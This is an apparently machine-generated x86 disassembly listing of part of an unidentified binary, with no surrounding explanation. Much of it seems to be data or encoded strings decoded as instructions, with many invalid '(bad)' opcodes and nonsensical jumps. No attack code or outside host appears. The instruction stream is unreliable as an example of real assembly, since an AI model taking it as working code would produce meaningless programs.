  41d44f:	ds retf 0x4247
  41d453:	add    BYTE PTR [ebp+0x55],ch
  41d456:	inc    esp
  41d457:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d45d:	in     eax,dx
  41d45e:	inc    BYTE PTR [edi]
  41d460:	aas    
  41d461:	cli    
  41d462:	mov    ds:0x41d45005,eax
  41d467:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d46d:	xchg   esi,eax
  41d46e:	pushf  
  41d46f:	clc    
  41d470:	mov    ah,0x95
  41d472:	pushf  
  41d473:	clc    
  41d474:	mov    ebx,0xbaf89c95
  41d479:	xchg   ebp,eax
  41d47a:	pushf  
  41d47b:	clc    
  41d47c:	mov    ecx,0xb8f89c95
  41d481:	xchg   ebp,eax
  41d482:	pushf  
  41d483:	clc    
  41d484:	mov    edi,0xbef89c95
  41d489:	xchg   ebp,eax
  41d48a:	pushf  
  41d48b:	clc    
  41d48c:	mov    ebp,0xa6f89c95
  41d491:	xchg   ebp,eax
  41d492:	pushf  
  41d493:	clc    
  41d494:	jmp    0x41d2:0x586003f9
  41d49b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d4a2:	jbe    0x41d4f4
  41d4a4:	mov    dh,0x85
  41d4a6:	pushf  
  41d4a7:	clc    
  41d4a8:	sbb    ecx,ebp
  41d4aa:	push   eax
  41d4ab:	pop    es
  41d4ac:	es pop es
  41d4ae:	add    BYTE PTR [eax],al
  41d4b0:	push   esp
  41d4b1:	rol    BYTE PTR [ecx+0x0],cl
  41d4b4:	sbb    ecx,DWORD PTR [ebx]
  41d4b6:	add    al,0xe
	...
  41d4e8:	mov    WORD PTR [eax],ss
  41d4ea:	inc    edx
  41d4eb:	add    BYTE PTR [esi+0x67f89c85],dh
  41d4f1:	pushw  0x68
  41d4f4:	addr16 push 0x67
  41d4f7:	pushw  0x6b6a
  41d4fb:	push   0x676b67
	...
  41d508:	es aas 
  41d50a:	inc    eax
  41d50b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d511:	dec    edi
  41d512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d513:	dec    edi
  41d514:	lahf   
  41d515:	dec    edi
  41d516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d517:	dec    edi
  41d518:	ins    DWORD PTR es:[edi],dx
  41d519:	dec    esi
  41d51a:	bound  ecx,QWORD PTR [esi+0x30]
  41d51d:	dec    esi
  41d51e:	add    BYTE PTR [eax],al
  41d520:	cdq    
  41d521:	dec    edi
  41d522:	pushf  
  41d523:	dec    edi
  41d524:	fwait
  41d525:	dec    edi
  41d526:	ins    DWORD PTR es:[edi],dx
  41d527:	dec    esi
  41d528:	bound  ecx,QWORD PTR [esi+0x30]
  41d52b:	dec    esi
  41d52c:	scas   eax,DWORD PTR es:[edi]
  41d52d:	dec    edi
  41d52e:	lods   eax,DWORD PTR ds:[esi]
  41d52f:	dec    edi
  41d530:	lahf   
  41d531:	dec    edi
  41d532:	mov    ds:0x624e6d4f,al
  41d537:	dec    esi
  41d538:	xor    BYTE PTR [esi+0x0],cl
  41d53b:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d541:	dec    edi
  41d542:	test   eax,0xa04f934f
  41d547:	dec    edi
  41d548:	fwait
  41d549:	dec    edi
  41d54a:	xor    BYTE PTR [esi+0x0],cl
  41d54d:	add    BYTE PTR [eax],al
  41d54f:	add    BYTE PTR [eax],al
  41d551:	add    BYTE PTR [eax],al
  41d553:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d55a:	mov    WORD PTR [ebp-0x32734274],gs
  41d560:	mov    ebp,ds
  41d562:	mov    ebp,gs
  41d564:	mov    ebp,?
  41d566:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d56c:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d572:	mov    WORD PTR [edx-0x74],?
  41d575:	jae    0x41d503
  41d577:	jo     0x41d505
  41d579:	jno    0x41d507
  41d57b:	jbe    0x41d509
  41d57d:	ja     0x41d50b
  41d57f:	je     0x41d50d
  41d581:	jne    0x41d50f
  41d583:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d58a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d590:	lods   al,BYTE PTR ds:[esi]
  41d591:	jge    0x41d54f
  41d593:	jge    0x41d533
  41d595:	(bad)  
  41d596:	jns    0x41d60b
  41d598:	mov    ecx,0x7d738cb1
  41d59d:	ins    DWORD PTR es:[edi],dx
  41d59e:	enter  0x9fc6,0x26
  41d5a2:	jb     0x41d5a7
  41d5a4:	test   eax,0xb956bb17
  41d5a9:	hlt    
  41d5aa:	test   al,0x37
  41d5ac:	test   al,0x7e
  41d5ae:	fnstenv [ecx-0x6a]
  41d5b1:	mov    cl,0x6a
  41d5b3:	push   0xffffffce
  41d5b5:	or     BYTE PTR [edx],bl
  41d5b7:	xlat   BYTE PTR ds:[ebx]
  41d5b8:	out    dx,eax
  41d5b9:	add    eax,0x9321d7aa
  41d5be:	scas   al,BYTE PTR es:[edi]
  41d5bf:	adc    DWORD PTR [esi],esp
  41d5c1:	jge    0x41d5e6
  41d5c3:	fidiv  WORD PTR [edi]
  41d5c5:	leave  
  41d5c6:	hlt    
  41d5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c8:	cmp    ax,0x1fc8
  41d5cc:	mov    dh,cl
  41d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cf:	(bad)  
  41d5d0:	and    DWORD PTR [eax],ebx
  41d5d2:	and    DWORD PTR [ecx-0x18],esi
  41d5d5:	(bad)  [ebx+0x7]
  41d5d8:	cmc    
  41d5d9:	enter  0x301a,0x40
  41d5dd:	adc    BYTE PTR [edx+0x0],al
  41d5e0:	jno    0x41d648
  41d5e2:	jp     0x41d652
  41d5e4:	dec    eax
  41d5e5:	aam    0x41
  41d5e7:	add    BYTE PTR [esp+edx*8-0x12f7ffbf],ch
  41d5ee:	adc    al,BYTE PTR [edi]
  41d5f0:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d5f7:	ins    BYTE PTR es:[edi],dx
  41d5f8:	push   0x49657557
  41d5fd:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d603:	push   edi
  41d604:	ins    BYTE PTR es:[edi],dx
  41d605:	inc    edx
  41d606:	push   0x76666a73
  41d60b:	inc    edx
  41d60c:	jo     0x41d657
  41d60e:	dec    ebp
  41d60f:	dec    ebp
  41d610:	pop    edx
  41d611:	jp     0x41d66d
  41d613:	jbe    0x41d65b
  41d615:	pop    ecx
  41d616:	jo     0x41d690
	...
  41d62c:	inc    ebp
  41d62d:	push   edx
  41d62e:	jb     0x41d6a4
  41d630:	inc    esi
  41d631:	je     0x41d674
  41d633:	inc    esi
  41d634:	jae    0x41d6ac
  41d636:	dec    ebx
  41d637:	gs inc edx
  41d639:	inc    bx
  41d63b:	push   ebp
  41d63c:	jno    0x41d6b4
  41d63e:	ja     0x41d6a7
  41d640:	dec    edi
  41d641:	dec    esp
  41d642:	dec    ebp
  41d643:	inc    edx
  41d644:	jno    0x41d6b7
  41d646:	jae    0x41d69b
  41d648:	dec    eax
  41d649:	inc    ebp
  41d64a:	inc    esp
  41d64b:	inc    esp
  41d64c:	push   ecx
  41d64d:	dec    edx
  41d64e:	ins    BYTE PTR es:[edi],dx
  41d64f:	dec    ebx
  41d650:	jbe    0x41d6c0
  41d652:	pop    eax
  41d653:	jbe    0x41d6a0
  41d655:	inc    ecx
  41d656:	fs gs jno 0x41d6c7
  41d65a:	push   ebx
  41d65b:	inc    ecx
  41d65c:	add    BYTE PTR [eax],al
  41d65e:	inc    ebx
  41d65f:	outs   dx,BYTE PTR ds:[esi]
  41d660:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d664:	push   edx
  41d665:	push   ecx
  41d666:	push   0x74000064
  41d66b:	jne    0x41d6e2
  41d66d:	ins    DWORD PTR es:[edi],dx
  41d66e:	push   ecx
  41d66f:	push   eax
  41d670:	jo     0x41d6ec
  41d672:	addr16 jo 0x41d6cb
  41d675:	pop    eax
  41d676:	add    BYTE PTR [eax],al
  41d678:	push   ecx
  41d679:	pop    ecx
  41d67a:	inc    ebx
  41d67b:	inc    edx
  41d67c:	outs   dx,BYTE PTR ds:[esi]
  41d67d:	popa   
  41d67e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d682:	jne    0x41d6f2
  41d684:	dec    ebx
  41d685:	add    BYTE PTR [ecx+0x45],bh
  41d688:	bound  ebp,QWORD PTR [ecx+0x46]
  41d68b:	dec    ecx
  41d68c:	ja     0x41d6d3
  41d68e:	dec    eax
  41d68f:	inc    ebp
  41d690:	inc    edx
  41d691:	push   ebx
  41d692:	add    BYTE PTR [eax],al
  41d694:	je     0x41d6f9
  41d696:	bound  esp,QWORD PTR [edi+0x78]
  41d699:	dec    eax
  41d69a:	bound  edx,QWORD PTR [ebx+0x43]
  41d69d:	pop    eax
  41d69e:	outs   dx,DWORD PTR ds:[esi]
  41d69f:	push   0x4355
  41d6a4:	inc    edi
  41d6a5:	gs ins BYTE PTR es:[edi],dx
  41d6a7:	dec    esp
  41d6a8:	js     0x41d712
  41d6aa:	inc    edx
  41d6ab:	js     0x41d6f3
  41d6ad:	arpl   WORD PTR [eax],ax
  41d6af:	add    BYTE PTR [eax],al
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    BYTE PTR [edx+0x70],cl
  41d6b6:	jb     0x41d730
  41d6b8:	outs   dx,DWORD PTR ds:[esi]
  41d6b9:	pop    eax
  41d6ba:	dec    ebx
  41d6bb:	push   esp
  41d6bc:	dec    esp
  41d6bd:	jns    0x41d70a
  41d6bf:	js     0x41d739
  41d6c1:	outs   dx,BYTE PTR ds:[esi]
  41d6c2:	pop    ecx
  41d6c3:	jae    0x41d733
  41d6c5:	push   0x43644448
  41d6ca:	arpl   WORD PTR [edx+0x55],sp
  41d6cd:	push   0x42504e67
  41d6d2:	push   ebp
  41d6d3:	je     0x41d74a
  41d6d5:	addr16 dec edi
  41d6d7:	dec    esp
  41d6d8:	inc    edx
  41d6d9:	ins    DWORD PTR es:[edi],dx
  41d6da:	inc    esi
  41d6db:	inc    esi
  41d6dc:	inc    esi
  41d6dd:	arpl   WORD PTR [edx+0x47],bx
  41d6e0:	push   ebp
  41d6e1:	inc    ebx
  41d6e2:	popa   
  41d6e3:	push   edx
  41d6e4:	dec    esp
  41d6e5:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d6ec:	push   ecx
  41d6ed:	push   ebx
  41d6ee:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d6f5:	dec    edx
  41d6f6:	jns    0x41d761
  41d6f8:	push   edx
  41d6f9:	inc    ebx
  41d6fa:	jo     0x41d771
  41d6fc:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d700:	fs push ebx
  41d702:	inc    ebx
  41d703:	push   ebp
  41d704:	push   eax
  41d705:	ja     0x41d781
  41d707:	jp     0x41d756
  41d709:	push   esi
  41d70a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d70e:	dec    edx
  41d70f:	dec    esi
  41d710:	data16 ja 0x41d761
  41d713:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d71a:	dec    esp
  41d71b:	cmp    ebx,ebp
  41d71d:	dec    esp
  41d71e:	lods   eax,DWORD PTR ds:[esi]
  41d71f:	out    dx,al
  41d720:	mov    ebp,0xa53ddffb
  41d725:	js     0x41d6e0
  41d727:	cmp    eax,0x7bc035f3
  41d72c:	xchg   esi,eax
  41d72d:	add    DWORD PTR [eax],eax
  41d72f:	lods   al,BYTE PTR ds:[esi]
  41d730:	add    BYTE PTR [eax],al
  41d732:	add    BYTE PTR [ecx],al
  41d734:	jb     0x41d770
  41d736:	or     edx,esp
  41d738:	out    0xcb,eax
  41d73a:	pop    esi
  41d73b:	pop    esi
  41d73c:	mov    dl,0x19
  41d73e:	adc    DWORD PTR [ebx+0x8],edi
  41d741:	jo     0x41d6f8
  41d743:	sti    
  41d744:	pop    ebx
  41d745:	cmp    al,0x58
  41d747:	stos   BYTE PTR es:[edi],al
  41d748:	int    0x4a
  41d74a:	call   0x8c6f72e7
  41d74f:	fcomp  st(7)
  41d751:	fistp  WORD PTR [ecx-0x388585ea]
  41d757:	gs xor eax,0x88572d6f
  41d75d:	sub    al,0x68
  41d75f:	add    cl,BYTE PTR [edi+0x6220d277]
  41d765:	xor    ecx,esi
  41d767:	sub    BYTE PTR [ebx-0x77],0xe
  41d76b:	adc    DWORD PTR [eax],esp
  41d76d:	loop   0x41d7d0
  41d76f:	jg     0x41d7eb
  41d771:	mov    ds:0xf5f0587b,eax
  41d776:	sbb    BYTE PTR [edi-0x9e4f19f],bl
  41d77c:	(bad)  
  41d77d:	mov    al,0x9a
  41d77f:	jecxz  0x41d77e
  41d781:	push   ebx
  41d782:	xor    BYTE PTR [ebp-0x42a6cf75],bl
  41d788:	repz jno 0x41d75a
  41d78b:	mov    esi,DWORD PTR [edi+0x43]
  41d78e:	push   ebp
  41d78f:	sbb    BYTE PTR [edi],dl
  41d791:	mov    gs,WORD PTR ds:0x8f310813
  41d797:	xor    esi,0x947ceeb2
  41d79d:	(bad)  
  41d79e:	rcl    BYTE PTR [ebx+0x13ff58bf],1
  41d7a4:	mov    ecx,0x8edb68a3
  41d7a9:	mov    eax,0x1e80d726
  41d7ae:	hlt    
  41d7af:	in     eax,0x40
  41d7b1:	xchg   BYTE PTR [edx+ebp*4-0x1e],al
  41d7b5:	lods   eax,DWORD PTR ds:[esi]
  41d7b6:	pop    esp
  41d7b7:	or     esi,DWORD PTR [ecx+0x1893f405]
  41d7bd:	loope  0x41d7ea
  41d7bf:	inc    ebx
  41d7c0:	(bad)  
  41d7c1:	jmp    0xfcc0:0x1e512c3e
  41d7c8:	bnd js 0x41d822
  41d7cb:	shl    DWORD PTR [eax-0x1d19d42c],0x7f
  41d7d2:	fild   WORD PTR [eax-0x38]
  41d7d5:	test   DWORD PTR [esi+0x833af60],ebp
  41d7db:	sub    ebp,DWORD PTR [edi]
  41d7dd:	outs   dx,BYTE PTR ds:[esi]
  41d7de:	out    0x0,al
	...
  41d7e8:	add    BYTE PTR [eax],al
  41d7ea:	add    BYTE PTR [eax],ch
  41d7ec:	mov    dl,0xa5
  41d7ee:	push   edx
  41d7ef:	mov    edi,0x7cfaff57
  41d7f4:	xlat   BYTE PTR fs:[ebx]
  41d7f6:	push   esi
  41d7f7:	and    ebx,0x56
  41d7fa:	push   edx
  41d7fb:	daa    
  41d7fc:	xchg   edi,eax
  41d7fd:	add    DWORD PTR [eax],eax
  41d7ff:	lods   al,BYTE PTR ds:[esi]
  41d800:	add    BYTE PTR [eax],al
  41d802:	add    BYTE PTR [eax-0x7814c8dc],dh
  41d808:	xchg   edi,eax
  41d809:	fs dec esi
  41d80b:	inc    edx
  41d80c:	sub    BYTE PTR [esi],cl
  41d80e:	rol    bh,0x39
  41d811:	inc    edi
  41d812:	fcomp  DWORD PTR [edx+0x5d]
  41d815:	sbb    BYTE PTR [eax],bh
  41d817:	sbb    DWORD PTR [edx],edx
  41d819:	mov    al,0x3d
  41d81b:	jecxz  0x41d877
  41d81d:	neg    BYTE PTR [ebx+0x56]
  41d820:	into   
  41d821:	jmp    0x22a66c25
  41d826:	xor    BYTE PTR [ecx],bh
  41d828:	(bad)  
  41d829:	or     esi,DWORD PTR [ecx-0x25]
  41d82c:	pop    ss
  41d82d:	stc    
  41d82e:	aaa    
  41d82f:	and    ah,dh
  41d831:	repnz push edi
  41d833:	cmc    
  41d834:	jne    0x41d7e0
  41d836:	pop    ss
  41d837:	rcl    BYTE PTR [edx-0x29],cl
  41d83a:	jnp    0x41d860
  41d83c:	sti    
  41d83d:	mov    bl,0x21
  41d83f:	int    0x50
  41d841:	pop    ss
  41d842:	jne    0x41d853
  41d844:	out    0xd9,al
  41d846:	mov    edi,0xc3e7e9db
  41d84b:	jb     0x41d86a
  41d84d:	leave  
  41d84e:	sahf   
  41d84f:	loopne 0x41d850
  41d851:	dec    ecx
  41d852:	add    eax,0xb1ad5b36
  41d857:	or     BYTE PTR [esi],ah
  41d859:	ficom  WORD PTR [edx+0x77]
  41d85c:	jp     0x41d82a
  41d85e:	adc    dh,BYTE PTR [edx]
  41d860:	nop
  41d861:	cmp    eax,0x1616727a
  41d866:	pop    ecx
  41d867:	adc    DWORD PTR [ecx-0x71b7325],edi
  41d86d:	and    ebp,edx
  41d86f:	jnp    0x41d814
  41d871:	adc    al,0x17
  41d873:	stos   BYTE PTR es:[edi],al
  41d874:	mov    BYTE PTR [edx-0x46],bh
  41d877:	fcom   DWORD PTR [eax+0xab445e5]
  41d87d:	test   eax,0xbabcc341
  41d882:	xchg   edi,eax
  41d883:	addr16 loopne 0x41d854
  41d886:	fstp   TBYTE PTR [edx+0x173964ad]
  41d88c:	inc    edx
  41d88d:	mov    ecx,DWORD PTR [edx+0x3f]
  41d890:	and    al,BYTE PTR [esi+0x6a538bba]
  41d896:	mov    ah,0x99
  41d898:	mov    cl,0x60
  41d89a:	dec    eax
  41d89b:	loopne 0x41d8f5
  41d89d:	fist   WORD PTR [ebx-0x25f373a6]
  41d8a3:	jp     0x41d8be
  41d8a5:	xchg   edx,eax
  41d8a6:	(bad)  
  41d8a7:	hlt    
  41d8a8:	cli    
  41d8a9:	call   0x250b357a
  41d8ae:	inc    eax
	...
  41d8bb:	mov    bl,0x55
  41d8bd:	jg     0x41d840
  41d8bf:	jmp    FWORD PTR [ebx-0x69418801]
  41d8c5:	push   0xa7675d57
  41d8ca:	rcl    DWORD PTR fs:[edi+0xac0001],cl
  41d8d1:	add    BYTE PTR [eax],al
  41d8d3:	adc    BYTE PTR [edi-0x41],ah
  41d8d6:	neg    DWORD PTR [ebx+ebp*4-0x43]
  41d8da:	dec    esi
  41d8db:	lods   al,BYTE PTR ds:[esi]
  41d8dc:	inc    esi
  41d8dd:	dec    ebx
  41d8de:	sbb    BYTE PTR [eax],bl
  41d8e0:	push   edi
  41d8e1:	lods   eax,DWORD PTR ds:[esi]
  41d8e2:	ror    BYTE PTR [edi+0x55f95596],1
  41d8e8:	pop    ds
  41d8e9:	into   
  41d8ea:	out    dx,eax
  41d8eb:	jecxz  0x41d92e
  41d8ed:	xchg   esp,eax
  41d8ee:	mov    al,ds:0x3d272406
  41d8f3:	add    BYTE PTR [ebx+edi*4],dh
  41d8f6:	or     BYTE PTR [edi-0x35],0x4e
  41d8fa:	repz sti 
  41d8fc:	pop    edx
  41d8fd:	push   0xffffffc6
  41d8ff:	sub    eax,0x1330e56a
  41d904:	ret    
  41d905:	nop
  41d906:	jb     0x41d8d9
  41d908:	push   cs
  41d909:	not    DWORD PTR [eax+0x32]
  41d90c:	gs sub eax,0xea0c39c5
  41d912:	test   DWORD PTR [ecx-0x76],esi
  41d915:	add    BYTE PTR [ecx+0x63],ah
  41d918:	leave  
  41d919:	push   ebx
  41d91a:	push   ds
  41d91b:	ss daa 
  41d91d:	xchg   esi,eax
  41d91e:	sub    DWORD PTR [ebx+eax*8],ebp
  41d921:	adc    BYTE PTR [edx],ch
  41d923:	fadd   st(7),st
  41d925:	add    BYTE PTR [ebx],ch
  41d927:	or     al,0x3d
  41d929:	jb     0x41d936
  41d92b:	hlt    
  41d92c:	dec    edi
  41d92d:	inc    esi
  41d92e:	dec    edx
  41d92f:	mov    WORD PTR [edi],gs
  41d931:	lahf   
  41d932:	and    ebx,ebp
  41d934:	es or  ebx,esi
  41d937:	aad    0x18
  41d939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d93a:	push   cs
  41d93b:	(bad)  
  41d93c:	pop    ds
  41d93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d93e:	pop    ds
  41d93f:	xchg   edx,eax
  41d940:	retf   
  41d941:	jno    0x41d986
  41d943:	push   ebx
  41d944:	and    edx,ecx
  41d946:	clc    
  41d947:	push   ss
  41d948:	mov    edi,0x4addc48e
  41d94d:	dec    ecx
  41d94e:	les    ebx,FWORD PTR [ecx]
  41d950:	mov    ds:0x9dad1fd5,eax
  41d955:	das    
  41d956:	dec    eax
  41d957:	pop    ebp
  41d958:	cdq    
  41d959:	mov    BYTE PTR [ecx],al
  41d95b:	cmp    BYTE PTR [ebx-0x3b5c7e34],bl
  41d961:	mov    ebx,0xa20a1e2a
  41d966:	mov    bh,0x71
  41d968:	pop    DWORD PTR [ebx+0xc]
  41d96b:	fcomp  st(5)
  41d96d:	add    al,0x6e
  41d96f:	jae    0x41d963
  41d971:	and    BYTE PTR [ebx-0x644675da],dl
  41d977:	sbb    al,0x52
  41d979:	(bad)  
  41d97b:	cmp    ebp,ebp
  41d97d:	xchg   eax,eax
	...
  41d98b:	cmp    dh,dl
  41d98d:	cmp    ah,BYTE PTR [esi+edi*8]
  41d990:	in     al,dx
  41d991:	fimul  WORD PTR ds:[edi-0x3a53942b]
  41d998:	js     0x41d95a
  41d99a:	mov    al,0x7f
  41d99c:	cwde   
  41d99d:	add    DWORD PTR [eax],eax
  41d99f:	lods   al,BYTE PTR ds:[esi]
  41d9a0:	add    BYTE PTR [eax],al
  41d9a2:	add    BYTE PTR [edx-0x1d89525],al
  41d9a8:	fstp   DWORD PTR [ebp+0xe]
  41d9ab:	sub    al,0x3e
  41d9ad:	(bad)  
  41d9ae:	push   edi
  41d9af:	push   cs
  41d9b0:	sbb    DWORD PTR ds:0xe4d27c8e,ebx
  41d9b6:	xor    dl,bl
  41d9b8:	dec    esi
  41d9b9:	xor    ah,BYTE PTR [ecx+ebp*8-0x56f19445]
  41d9c0:	and    cl,BYTE PTR [ebx+0x3b]
  41d9c3:	je     0x41d9bc
  41d9c5:	bound  eax,QWORD PTR [ebx+0x22]
  41d9c8:	cmp    al,0xe4
  41d9ca:	push   ds
  41d9cb:	popa   
  41d9cc:	cld    
  41d9cd:	mov    dh,0x75
  41d9cf:	inc    ch
  41d9d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9d2:	xlat   BYTE PTR ds:[ebx]
  41d9d3:	jae    0x41da25
  41d9d5:	sbb    ch,ch
  41d9d7:	mov    BYTE PTR [eax-0x4b],ch
  41d9da:	xor    dl,bh
  41d9dc:	jge    0x41da58
  41d9de:	js     0x41da4c
  41d9e0:	dec    esi
  41d9e1:	cwde   
  41d9e2:	adc    bh,BYTE PTR [edx]
  41d9e4:	mov    bh,0xcb
  41d9e6:	mov    dl,0xce
  41d9e8:	aas    
  41d9e9:	sub    ch,cl
  41d9eb:	mov    edi,0x5ad36bf5
  41d9f0:	shr    BYTE PTR [edx],0x57
  41d9f3:	or     ax,dx
  41d9f6:	fs xchg ecx,eax
  41d9f8:	fst    QWORD PTR [ebx+edi*8]
  41d9fb:	sbb    ah,BYTE PTR [eax+0x52]
  41d9fe:	sbb    DWORD PTR [ebp+0x5cdf9e15],ecx
  41da04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da05:	xchg   esi,eax
  41da06:	inc    esi
  41da07:	fldcw  WORD PTR [eax-0x63]
  41da0a:	lock sbb ecx,DWORD PTR [ecx-0x31]
  41da0e:	ror    BYTE PTR [ebx-0x3a],1
  41da11:	test   bl,dl
  41da13:	sub    ebp,DWORD PTR [eax-0x15]
  41da16:	sbb    BYTE PTR [ebx+0x6c],ah
  41da19:	or     BYTE PTR [esi+0xdf312e],ah
  41da1f:	stos   BYTE PTR es:[edi],al
  41da20:	adc    edx,0xa41d2785
  41da26:	or     esi,DWORD PTR [eax]
  41da28:	ror    BYTE PTR [esi-0x7d529bb4],0x2f
  41da2f:	cwde   
  41da30:	lahf   
  41da31:	js     0x41da47
  41da33:	mov    dl,ah
  41da35:	mov    bl,BYTE PTR [edi+0x6bc331e6]
  41da3b:	push   ebx
  41da3c:	repz aas 
  41da3e:	aas    
  41da3f:	out    0x66,al
  41da41:	ret    
  41da42:	lea    edi,[edi+0x19]
  41da45:	jmp    DWORD PTR [esi+0x7d]
  41da48:	mov    eax,DWORD PTR [ebx]
  41da4a:	fisubr DWORD PTR [esi+0x5d]
  41da4d:	mov    eax,0xe1
	...
  41da5a:	add    cl,bl
  41da5c:	mov    dh,0x66
  41da5e:	sbb    ebp,DWORD PTR [edi-0x25]
  41da61:	std    
  41da62:	neg    BYTE PTR [esi]
  41da64:	sub    esp,DWORD PTR [ebx-0x23]
  41da67:	fisttp QWORD PTR [edi-0x1e]
  41da6a:	loope  0x41da97
  41da6c:	cdq    
  41da6d:	add    DWORD PTR [eax],eax
  41da6f:	lods   al,BYTE PTR ds:[esi]
  41da70:	add    BYTE PTR [eax],al
  41da72:	add    BYTE PTR [ebx-0x1dcf3646],ah
  41da78:	ss push ds
  41da7a:	or     al,0xc
  41da7c:	jl     0x41da15
  41da7e:	shr    DWORD PTR [edx],1
  41da80:	push   ebx
  41da81:	push   ecx
  41da82:	mov    edx,DWORD PTR [eax-0x65d9dcdf]
  41da88:	out    0x43,al
  41da8a:	or     BYTE PTR [eax-0x49],0x1
  41da8e:	sbb    DWORD PTR [esi+ecx*4-0x63],edx
  41da92:	ds pop esi
  41da94:	daa    
  41da95:	sub    BYTE PTR [ebp+0x41],al
  41da98:	lods   eax,DWORD PTR ds:[esi]
  41da99:	pop    ss
  41da9a:	sub    DWORD PTR [esi+eiz*1],esp
  41da9d:	ja     0x41da28
  41da9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daa0:	adc    al,0x66
  41daa2:	int    0x23
  41daa4:	ins    DWORD PTR es:[edi],dx
  41daa5:	mov    al,ds:0x6edbf3c
  41daaa:	(bad)  
  41daab:	xor    al,0x7e
  41daad:	pop    ecx
  41daae:	fimul  WORD PTR ds:0x2986c790
  41dab4:	xlat   BYTE PTR ds:[ebx]
  41dab5:	jmp    0x91b3:0xf83ccce3
  41dabc:	add    DWORD PTR [ebp+0x5cb7a3e3],esp
  41dac2:	pusha  
  41dac3:	push   edi
  41dac4:	jg     0x41db30
  41dac6:	sub    BYTE PTR [ebp+edi*8+0x7a],bh
  41daca:	test   DWORD PTR [esi-0x61aef38c],esi
  41dad0:	mov    cl,0xd9
  41dad2:	push   edi
  41dad3:	fsubr  QWORD PTR [esi+ebp*1+0x74]
  41dad7:	sbb    DWORD PTR [ecx-0x19d86946],esp
  41dadd:	xor    bl,bh
  41dadf:	dec    edi
  41dae0:	xchg   ebp,eax
  41dae1:	in     eax,0xe
  41dae3:	adc    al,0x97
  41dae5:	js     0x41dab1
  41dae7:	in     al,dx
  41dae8:	mov    ebp,0x5e5dc767
  41daed:	mov    ebx,0xa4f13196
  41daf2:	jno    0x41db6a
  41daf4:	enter  0x498b,0xa
  41daf8:	bound  ecx,QWORD PTR [ecx-0x24edd984]
  41dafe:	dec    ebp
  41daff:	sbb    ecx,DWORD PTR [edx+esi*2+0x4ca392a1]
  41db06:	mov    ecx,0xc64a14de
  41db0b:	bnd jmp 0x1d4147be
  41db11:	xor    eax,0xece6fcf2
  41db16:	push   edx
  41db17:	mov    cl,ah
  41db19:	sbb    al,0xa0
  41db1b:	js     0x41db5d
  41db1d:	inc    eax
  41db1e:	sldt   WORD PTR [eax]
	...
  41db29:	add    BYTE PTR [eax],al
  41db2b:	fidiv  DWORD PTR [edx]
  41db2d:	xchg   edi,eax
  41db2e:	mov    bh,bh
  41db30:	scas   eax,DWORD PTR es:[edi]
  41db31:	fbstp  TBYTE PTR [edx+0x3]
  41db34:	inc    ebp
  41db35:	mov    ds:0x6cad555c,eax
  41db3a:	js     0x41db13
  41db3c:	cdq    
  41db3d:	add    DWORD PTR [eax],eax
  41db3f:	lods   al,BYTE PTR ds:[esi]
  41db40:	add    BYTE PTR [eax],al
  41db42:	add    BYTE PTR [esi+0x3c],ch
  41db45:	and    BYTE PTR [esi],dh
  41db47:	sub    al,0x5e
  41db49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db4a:	jbe    0x41db43
  41db4c:	jle    0x41dbcd
  41db4e:	js     0x41db1c
  41db50:	cmp    BYTE PTR [ecx-0x5a5182a8],0x18
  41db57:	jecxz  0x41dae2
  41db59:	retf   
  41db5a:	pop    ebp
  41db5b:	fcomp  QWORD PTR [esi+0x53]
  41db5e:	push   ss
  41db5f:	into   
  41db60:	adc    dl,BYTE PTR [ecx+edi*2+0x5978263d]
  41db67:	cli    
  41db68:	(bad)  
  41db69:	jmp    0x39e2:0x9f4904e
  41db70:	xchg   ebp,eax
  41db71:	fcomp  DWORD PTR [edx]
  41db73:	mov    ebp,0x8c07ae8
  41db78:	push   ds
  41db79:	push   es
  41db7a:	mov    ss,WORD PTR [edx]
  41db7c:	ins    DWORD PTR es:[edi],dx
  41db7d:	cdq    
  41db7e:	sub    DWORD PTR [ebx-0x7d],edx
  41db81:	mov    DWORD PTR [eax-0x16],ecx
  41db84:	mov    BYTE PTR [eax],dl
  41db86:	(bad)  
  41db87:	fbld   TBYTE PTR [ebp-0x9]
  41db8a:	mov    bl,0xba
  41db8c:	lea    eax,[esi+0x202bfd4]
  41db92:	repz pop esi
  41db94:	push   esi
  41db95:	add    al,0xe5
  41db97:	sub    esi,edi
  41db99:	sub    DWORD PTR [ecx],ebp
  41db9b:	dec    esp
  41db9c:	stos   DWORD PTR es:[edi],eax
  41db9d:	adc    eax,0x93d1855c
  41dba2:	jb     0x41dbff
  41dba4:	push   ebp
  41dba5:	jge    0x41dc1d
  41dba7:	and    eax,0x731f5866
  41dbac:	dec    edi
  41dbad:	ja     0x41dbcc
  41dbaf:	adc    eax,0xb844e704
  41dbb4:	jl     0x41dbe0
  41dbb6:	test   al,0xb6
  41dbb8:	aam    0x82
  41dbba:	(bad)
